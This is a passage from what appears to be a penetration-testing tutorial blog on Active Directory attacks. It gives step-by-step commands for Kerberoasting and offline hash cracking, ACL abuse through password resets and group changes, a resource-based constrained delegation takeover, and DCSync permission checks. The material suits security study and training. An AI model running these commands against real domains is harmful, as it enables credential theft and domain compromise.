<span class="c"># in current directory:</span>
kirbi2john &lt;kirbi file name&gt;

<span class="c"># modify file to make it crackable with hashcat:</span>
<span class="nb">sed</span> <span class="s1">'s/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/'</span> crack_file <span class="o">&gt;</span> &lt;<span class="nb">hash </span>file name&gt;

<span class="c"># crack the ticket with hashcat:</span>
hashcat <span class="nt">-m</span> 13100 &lt;<span class="nb">hash </span>file name&gt; &lt;wordlist path&gt;

<span class="c"># crack the ticket with john:</span>
john &lt;<span class="nb">hash </span>file name&gt; <span class="nt">--wordlist</span><span class="o">=</span>&lt;wordlist path&gt;
</code></pre></div>

<p>automated tools are of course much easier and faster. we can use either <code>powerview</code> or <code>rubeus</code>:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># import powerview in current powershell</span><span class="w">
</span><span class="c"># session:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">

</span><span class="c"># list all SPN accounts:</span><span class="w">
</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-spn</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">samaccountname</span><span class="w">

</span><span class="c"># get TGS ticket in hashcat format for</span><span class="w">
</span><span class="c"># specified SPN account:</span><span class="w">
</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">SPN</span><span class="w"> </span><span class="nx">account</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-DomainSPNTicket</span><span class="w"> </span><span class="nt">-Format</span><span class="w"> </span><span class="nx">Hashcat</span><span class="w">

</span><span class="c"># export all TGS tickets in hashcat</span><span class="w">
</span><span class="c"># format to CSV file:</span><span class="w">
</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-SPN</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-DomainSPNTicket</span><span class="w"> </span><span class="nt">-Format</span><span class="w"> </span><span class="nx">Hashcat</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Export-Csv</span><span class="w"> </span><span class="o">.</span><span class="nx">\</span><span class="err">&lt;</span><span class="nx">CSV</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-NoTypeInformation</span><span class="w">

</span><span class="c"># with rubeus on windows host, use</span><span class="w">
</span><span class="c"># the /stats flag to find kerberoastable</span><span class="w">
</span><span class="c"># accounts:</span><span class="w">
</span><span class="o">.</span><span class="n">\Rubeus.exe</span><span class="w"> </span><span class="nx">kerberoast</span><span class="w"> </span><span class="nx">/stats</span><span class="w">

</span><span class="c"># get TGS tickets for valuable accounts</span><span class="w">
</span><span class="c"># (admincount=1), and prevent them to</span><span class="w">
</span><span class="c"># wrap with base64 encoding:</span><span class="w">
</span><span class="o">.</span><span class="n">\Rubeus.exe</span><span class="w"> </span><span class="nx">kerberoast</span><span class="w"> </span><span class="nx">/ldapfilter:</span><span class="s1">'admincount=1'</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">

</span><span class="c"># get TGS ticket for a single SPN</span><span class="w">
</span><span class="c"># account:</span><span class="w">
</span><span class="o">.</span><span class="n">\Rubeus.exe</span><span class="w"> </span><span class="nx">kerberoast</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">SPN</span><span class="w"> </span><span class="nx">account</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">

</span><span class="c"># on attack box, crack a ticket with</span><span class="w">
</span><span class="c"># hashcat:</span><span class="w">
</span><span class="n">hashcat</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">13100</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">hash</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">wordlist</span><span class="w"> </span><span class="nx">path</span><span class="err">&gt;</span><span class="w">

</span><span class="c"># crack a ticket with john:</span><span class="w">
</span><span class="n">john</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">hash</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">--wordlist</span><span class="o">=</span><span class="err">&lt;</span><span class="n">wordlist</span><span class="w"> </span><span class="nx">path</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p>an important note about encryption: most tools request TGS tickets encrypted with RC4, as it is easier to crack than modern encryption algorithms like AES-128 or AES-256. we can see RC4 is used when a ticket begins with <code>$krb5tgs$23$</code> (type 23), rather than <code>$krb5tgs$17$</code> (type 17, AES-128) or <code>$krb5tgs$18$</code> (type 18, AES-256). it&#39;s not impossible to crack those last two, but it can take significantly more time.</p>

<p>rubeus can also force a TGS ticket to be encrypted with RC4 by specifying this is the only algorithm we support in the request: we can add the <code>/tgtdeleg</code> flag for this purpose. this will only work on windows server 2016 or earlier, however.</p>

<h3>ACL abuse</h3>

<p>access control lists (ACLs) are also a great way of enabling lateral movement and/or privilege escalation. in AD, they are discretionary access control lists (DACLs), which are composed of access control entries (ACEs). those define if a security principal is granted or denied access to an object. instead of DACLs, they can also be system access control lists (SACLs), which we can see as agents logging access attempts to secured objects. we can see them in the <code>auditing</code> tab in the user&#39;s advanced security settings.</p>

<p>a few reminders about DACLs and ACEs:</p>

<ul>
<li>if an object doesn&#39;t have a DACL, everybody has all rights over it</li>
<li>if an object have an empty DACL (no ACEs), no one has any rights over it</li>
<li>each ACE is composed of four settings:

<ul>
<li>the SID of the user/group which has access on the object</li>
<li>a flag determining the ACE: access allowed, denied, or system audit (SACL)</li>
<li>a set of flags that determine if the ACE is inherited to child objects</li>
<li>an access mask (a 32-bit set of flags) which determines the specific rights granted to the object</li>
</ul></li>
</ul>

<p>many rights granted from an ACE can be interesting from an offensive standpoint, but here are the main ones:</p>

<table><thead>
<tr>
<th>ACE right</th>
<th>powerview command</th>
<th>description</th>
</tr>
</thead><tbody>
<tr>
<td>ForceChangePassword</td>
<td>Set-DomainUserPassword</td>
<td>reset a user&#39;s password</td>
</tr>
<tr>
<td>GenericWrite</td>
<td>Set-DomainObject</td>
<td>write to attributes of the object</td>
</tr>
<tr>
<td>AddSelf</td>
<td>Add-DomainGroupMember</td>
<td>add yourself to security groups</td>
</tr>
<tr>
<td>GenericAll</td>
<td>Set-DomainUserPassword</td>
<td>full control over the object</td>
</tr>
</tbody></table>

<p>common attacks can include the following scenarios:</p>

<ul>
<li>password permissions: helpdesk and IT users often have permissions to reset passwords. if we have access to such an account, we could reset the password of another account with higher privileges.</li>
<li>group management: helpdesk and IT users can often remove or add users from specific groups. we could add ourselves to a privileged group that way and get additional permissions.</li>
<li>excessive rights: a user might have excessive and unintended rights that have gone unnoticed by the admin, making it a prime target for privilege escalation.</li>
</ul>

<p>what makes ACL abuse interesting is that the entries we can leverage often went unchecked and are rarely detected by vulnerability scanners. this is especially the case in complex environments. let&#39;s see how we can enumerate and use them on a windows host:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># import powerview:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">

</span><span class="c"># powerview can be used, but this will</span><span class="w">
</span><span class="c"># result in massive outputs that are a</span><span class="w">
</span><span class="c"># nightmare to parse, like this command:</span><span class="w">
</span><span class="n">Find-InterestingDomainAcl</span><span class="w">

</span><span class="c"># to make this more usable, we need to</span><span class="w">
</span><span class="c"># begin with the ACL of a single user</span><span class="w">
</span><span class="c"># whose credentials we already got</span><span class="w">
</span><span class="c"># earlier. first, we get the SID</span><span class="w">
</span><span class="c"># of said user:</span><span class="w">
</span><span class="nv">$sid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Convert-NameToSid</span><span class="w"> </span><span class="nx">wley</span><span class="w">

</span><span class="c"># find all domain objects that our</span><span class="w">
</span><span class="c"># user has rights over. pay attention</span><span class="w">
</span><span class="c"># to the ObjectAceType qualifier to</span><span class="w">
</span><span class="c"># understand which right we have over</span><span class="w">
</span><span class="c"># a found object. if you want to look</span><span class="w">
</span><span class="c"># permissions over a specific group</span><span class="w">
</span><span class="c"># rather than all objects, replace</span><span class="w">
</span><span class="c"># the wildcard with specified group:</span><span class="w">
</span><span class="n">Get-DomainObjectACL</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">SecurityIdentifier</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$sid</span><span class="p">}</span><span class="w">

</span><span class="c"># if you can't resolve GUIDs like above,</span><span class="w">
</span><span class="c"># you can always perform a reverse search</span><span class="w">
</span><span class="c"># to get the right it is mapped to:</span><span class="w">
</span><span class="nv">$guid</span><span class="o">=</span><span class="w"> </span><span class="s2">"&lt;GUID&gt;"</span><span class="w">
</span><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-SearchBase</span><span class="w"> </span><span class="s2">"CN=Extended-Rights,</span><span class="si">$(</span><span class="p">(</span><span class="n">Get-ADRootDSE</span><span class="p">)</span><span class="s2">.ConfigurationNamingContext)"</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">ObjectClass</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'ControlAccessRight'</span><span class="p">}</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="n">Select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="nx">DisplayName</span><span class="p">,</span><span class="nx">DistinguishedName</span><span class="p">,</span><span class="nx">rightsGuid</span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">rightsGuid</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$guid</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">

</span><span class="c"># once we found a domain user we might pivot to, we can</span><span class="w">
</span><span class="c"># re-run Get-DOmainObjectACL above (possibly with the -Verbose flag)</span><span class="w">
</span><span class="c"># with its SID to find if this is a worthwhile path for</span><span class="w">
</span><span class="c"># pivoting / privilege escalation.</span><span class="w">

</span><span class="c"># we can also investigate if a group is a child</span><span class="w">
</span><span class="c"># of another interesting group, whose privileges</span><span class="w">
</span><span class="c"># we might inherit if we added ourselves to it:</span><span class="w">
</span><span class="n">Get-DomainGroup</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"&lt;group name&gt;"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">memberof</span><span class="w">

</span><span class="c"># we can then re-run Get-DOmainObjectACL once more</span><span class="w">
</span><span class="c"># with the parent group to find which privileges</span><span class="w">
</span><span class="c"># we might inherit from them. this process is all</span><span class="w">
</span><span class="c"># about iteration.</span><span class="w">
</span></code></pre></div>

<p>if we can&#39;t upload powerview, we can also live off the land even if the process is way slower:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># create a list of domain users:</span><span class="w">
</span><span class="n">Get-ADUser</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">SamAccountName</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">AD</span><span class="w"> </span><span class="nx">users</span><span class="w"> </span><span class="nx">file</span><span class="err">&gt;</span><span class="o">.</span><span class="nf">txt</span><span class="w">

</span><span class="c"># loop through all domain users and</span><span class="w">
</span><span class="c"># retrieve ACL info for each of them,</span><span class="w">
</span><span class="c"># then find which rights are held by</span><span class="w">
</span><span class="c"># our user:</span><span class="w">
</span><span class="kr">foreach</span><span class="p">(</span><span class="nv">$line</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="p">[</span><span class="n">System.IO.File</span><span class="p">]::</span><span class="n">ReadLines</span><span class="p">(</span><span class="s2">"C:\&lt;AD users file path&gt;"</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="n">get-acl</span><span class="w">  </span><span class="s2">"AD:\</span><span class="si">$(</span><span class="n">Get-ADUser</span><span class="w"> </span><span class="nv">$line</span><span class="p">)</span><span class="s2">"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select-Object</span><span class="w"> </span><span class="nx">Path</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">Access</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReference</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'&lt;DC name without domain&gt;\\&lt;our user&gt;'</span><span class="p">}}</span><span class="w">

</span><span class="c"># then resolve GUIDs like shown above:</span><span class="w">
</span><span class="nv">$guid</span><span class="o">=</span><span class="w"> </span><span class="s2">"&lt;GUID&gt;"</span><span class="w">
</span><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-SearchBase</span><span class="w"> </span><span class="s2">"CN=Extended-Rights,</span><span class="si">$(</span><span class="p">(</span><span class="n">Get-ADRootDSE</span><span class="p">)</span><span class="s2">.ConfigurationNamingContext)"</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">ObjectClass</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'ControlAccessRight'</span><span class="p">}</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="n">Select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="nx">DisplayName</span><span class="p">,</span><span class="nx">DistinguishedName</span><span class="p">,</span><span class="nx">rightsGuid</span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">rightsGuid</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$guid</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">
</span></code></pre></div>

<p>but this entire process is infinitely easier with <code>bloodhound</code>. after running a collector and exporting the data + importing it in bloodhound, we can select our compromised user, select the node info tab and scroll to <code>outbound control rights</code>. this will allow us to see objects we have control of directly, and objects we might get to control with ACL abuse, under <code>transitive object control</code>. if we click the numbers next to direct or transitive object controls, we will be shown the graph of the vulnerable path. if we right-click any line between two objects, we will be shown the help to abuse the related ACE. pretty neat.</p>

<p>once a possible path for lateral movement / privilege escalation has been found, here are some helpful commands with powerview:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># change password of user,</span><span class="w">
</span><span class="c"># if we have User-Force-Change-Password</span><span class="w">
</span><span class="c"># rights over them:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span><span class="nv">$SecPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'&lt;our password&gt;'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="nv">$Cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s1">'&lt;DC name without domain&gt;\&lt;our user name&gt;'</span><span class="p">,</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="p">)</span><span class="w"> 
</span><span class="nv">$TargetPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'&lt;password&gt;'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="n">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">target</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="nv">$TargetPassword</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">

</span><span class="c"># add user to specified group, if</span><span class="w">
</span><span class="c"># they have AddSelf rights.</span><span class="w">
</span><span class="c"># first, create a SecureString object:</span><span class="w">
</span><span class="nv">$SecPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'&lt;user password&gt;'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span><span class="nv">$Cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s1">'&lt;DC name without domain\&lt;target user name&gt;'</span><span class="p">,</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="p">)</span><span class="w"> 
</span><span class="c"># confirm that user is not a member of the group</span><span class="w">
</span><span class="c"># so far:</span><span class="w">
</span><span class="n">Get-ADGroup</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'&lt;group name&gt;'</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">Members</span><span class="w">
</span><span class="c"># finally, add user to group:</span><span class="w">
</span><span class="n">Add-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'&lt;group name&gt;'</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="s1">'&lt;target user name&gt;'</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="c"># check if user is part of the group:</span><span class="w">
</span><span class="n">Get-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"&lt;group name&gt;"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">MemberName</span><span class="w">
</span><span class="c"># once done, remove user from group:</span><span class="w">
</span><span class="n">Remove-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"&lt;group name&gt;"</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="s1">'&lt;target user name&gt;'</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="c"># confirm user has been removed:</span><span class="w">
</span><span class="n">Get-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"&lt;group name&gt;"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nx">MemberName</span><span class="w"> </span><span class="o">|</span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">MemberName</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s1">'&lt;target user name&gt;'</span><span class="p">}</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">

</span><span class="c"># make an account kerberoastable, if</span><span class="w">
</span><span class="c"># we have GenericAll rights. first,</span><span class="w">
</span><span class="c"># create a fake SPN with the user</span><span class="w">
</span><span class="c"># possessing those rights. keep in</span><span class="w">
</span><span class="c"># mind that $Cred in this context</span><span class="w">
</span><span class="c"># are our own:</span><span class="w">
</span><span class="n">Set-DomainObject</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">kerberoastable</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-SET</span><span class="w"> </span><span class="p">@{</span><span class="nx">serviceprincipalname</span><span class="o">=</span><span class="s1">'&lt;fake SPN first name&gt;/&lt;fake SPN last name&gt;'</span><span class="p">}</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="c"># then, kerberoast the user with</span><span class="w">
</span><span class="c"># rubeus:</span><span class="w">
</span><span class="o">.</span><span class="n">\Rubeus.exe</span><span class="w"> </span><span class="nx">kerberoast</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">kerberoastable</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
</span><span class="c"># after cracking the hash offline,</span><span class="w">
</span><span class="c"># as shown earlier, remove the fake</span><span class="w">
</span><span class="c"># SPN we made:</span><span class="w">
</span><span class="n">Set-DomainObject</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">kerberoastable</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Clear</span><span class="w"> </span><span class="nx">serviceprincipalname</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></code></pre></div>

<p>on the blue side of things, shall we ever need it, we can use the <code>ConvertFrom-SddlString</code> cmdlet to convert SDDL messages into a readable format. this could help us see if we&#39;re leaving traces of our changes in the event viewer:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># convert SDDL string:</span><span class="w">
</span><span class="n">ConvertFrom-SddlString</span><span class="w"> </span><span class="s2">"&lt;looong SDDL string&gt;"</span><span class="w">

</span><span class="c"># only show DACLs changes from SDDL string:</span><span class="w">
</span><span class="n">ConvertFrom-SddlString</span><span class="w"> </span><span class="s2">"&lt;looong SDDL string&gt;"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">DiscretionaryAcl</span><span class="w">
</span></code></pre></div>

<h3>Resource Based Constrained Delegation (RBCD) attack</h3>

<p>If we control a user with permissions to modify another computer&#39;s <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute (with <code>GenericAll</code> for instance), we can perform a RBCD attack which works as follows:</p>

<ul>
<li>Create a machine account with an SPN that we can control.</li>
<li>Configure RBCD on the target computer, allowing our created machine account to control it.</li>
<li>Obtain a Kerberos ticket to impersonate a privileged user on the target computer.</li>
<li>Use the ticket for privilege escalation and / or lateral movement.</li>
</ul>

<p>We need to create a machine account because we need an SPN for this attack to work: while performing a RBCD attack with a user account can be achieved, it would render it unusable afterwards. This method is more flexible, and users can easily add machine accounts as most domains&#39; <code>ms-DS-MachineAccountQuota</code> attribute is set to 10, the default parameter.</p>

<p>From our Linux machine, occasionally checking results with a shell on the domain, this can be achieved with the following steps:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># First, create the machine account:</span>
addcomputer.py &lt;DC domain&gt;/&lt;username we control&gt; <span class="nt">-dc-ip</span> &lt;DC IP&gt; <span class="nt">-hashes</span> :&lt;user <span class="nb">hash</span><span class="o">&gt;</span> <span class="nt">-computer-name</span> <span class="s1">'ATTACK$'</span> <span class="nt">-computer-pass</span> <span class="s1">'Summer2018!'</span>

<span class="c"># Check if the machine account has been created within the domain:</span>
get-adcomputer attack

<span class="c"># Set RBCD on the target computer:</span>
rbcd.py <span class="nt">-dc-ip</span> &lt;DC IP&gt; <span class="nt">-delegate-to</span> <span class="s1">'&lt;target computer name&gt;$'</span> <span class="nt">-delegate-from</span> <span class="s1">'ATTACK$'</span> <span class="nt">-hashes</span> :&lt;user <span class="nb">hash</span><span class="o">&gt;</span> <span class="nt">-action</span> write <span class="s1">'&lt;DC domain&gt;/&lt;username we control&gt;'</span>

<span class="c"># Confirm this worked in the domain:</span>
Get-adcomputer resourcedc <span class="nt">-properties</span> msds-allowedtoactonbehalfofotheridentity |select <span class="nt">-expand</span> msds-allowedtoactonbehalfofotheridentity

<span class="c"># Get admin's service ticket from the target computer:</span>
getST.py <span class="nt">-dc-ip</span> &lt;DC IP&gt; <span class="nt">-spn</span> <span class="s1">'cifs/&lt;target machine SPN&gt;'</span> <span class="nt">-impersonate</span> <span class="s1">'administrator'</span> <span class="s1">'&lt;DC doamin&gt;/attack$:Summer2018!'</span>

<span class="c"># If the ticket has been properly created, export the environment variable:</span>
<span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>./administrator@cifs_&lt;target machine SPN&gt;@&lt;DC domain&gt;.ccache

<span class="c"># Add an entry in our /etc/hosts:</span>
&lt;DC IP&gt; &lt;target machine SPN&gt;

<span class="c"># Log in as SYSTEM on target computer:</span>
psexec.py <span class="nt">-k</span> <span class="nt">-no-pass</span> &lt;target machine SPN&gt; <span class="nt">-dc-ip</span> &lt;DC IP&gt;
</code></pre></div>

<h3>DCSync attack</h3>

<p>if a user has <code>replicating directory changes</code> and <code>replicating directory changes all</code> permissions set, which is the default for domain/enterprise admins and default domain admins, we can steal the active directory password database if we manage to compromise them. this allows us to get the NTLM password hashes of all domain users, on top of the hashes of their previous passwords.</p>

<p>the required permissions set can be seen in <code>ADSI edit</code> if needed. but powerview can again prove itself useful for this attack:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># import powerview:</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">

</span><span class="c"># view group membership of user</span><span class="w">
</span><span class="c"># and get their SID:</span><span class="w">
</span><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">username</span><span class="err">&gt;</span><span class="w"> </span><span class="o">|</span><span class="n">select</span><span class="w"> </span><span class="nx">samaccountname</span><span class="p">,</span><span class="nx">objectsid</span><span class="p">,</span><span class="nx">memberof</span><span class="p">,</span><span class="nx">useraccountcontrol</span><span class="w"> </span><span class="o">|</span><span class="n">fl</span><span class="w">

</span><span class="c"># use Get-ObjectAcl to specifically</span><span class="w">
</span><span class="c"># check for replication rights with</span><span class="w">
</span><span class="c"># previously obtained SID:</span><span class="w">
</span><span class="nv">$sid</span><span class="o">=</span><span class="w"> </span><span class="s2">"&lt;user sid&gt;"</span><span class="w">
</span><span class="n">Get-ObjectAcl</span><span class="w"> </span><span class="s2">"DC=&lt;DC name&gt;,DC=&lt;DC domain&gt;"</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ObjectAceType</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'Replication-Get'</span><span class="p">)}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">SecurityIdentifier</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="nv">$sid</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="n">select</span><span class="w"> </span><span class="nx">AceQualifier</span><span class="p">,</span><span class="w"> </span><span class="nx">ObjectDN</span><span class="p">,</span><span class="w"> </span><span class="nx">ActiveDirectoryRights</span><span class="p">,</span><span class="nx">SecurityIdentifier</span><span class="p">,</span><span class="nx">ObjectAceType</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">

</span><span class="c"># if we see DS-Replication-Get-Changes and</span><span class="w">
</span><span class="c"># DS-Replication-Get-Changes-All in ObjectAceType</span><span class="w">
</span><span class="c"># listings of this user, we are good to go.</span><span class="w">
</span></code></pre></div>

<p>now that those permissions have been confirmed, we have various tools at our disposal to perform DCSync replication:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># get NTLM hashes and kerberos keys with impacket's secretsdump.py.</span>
<span class="c"># if you only want NTLM hashes, replace -just-dc with -just-dc-ntlm.</span>
<span class="c"># if you only want to get secrets of a specific user,</span>
<span class="c"># use -just-dc-user &lt;username&gt;. other useful flags include</span>
<span class="c"># -pwd-last-set to check when each account's password was last changed,</span>
<span class="c"># and -history to dump password history so we can crack old passwords.</span>
<span class="c"># -user-status is also useful to check if a user is disabled or not:</span>
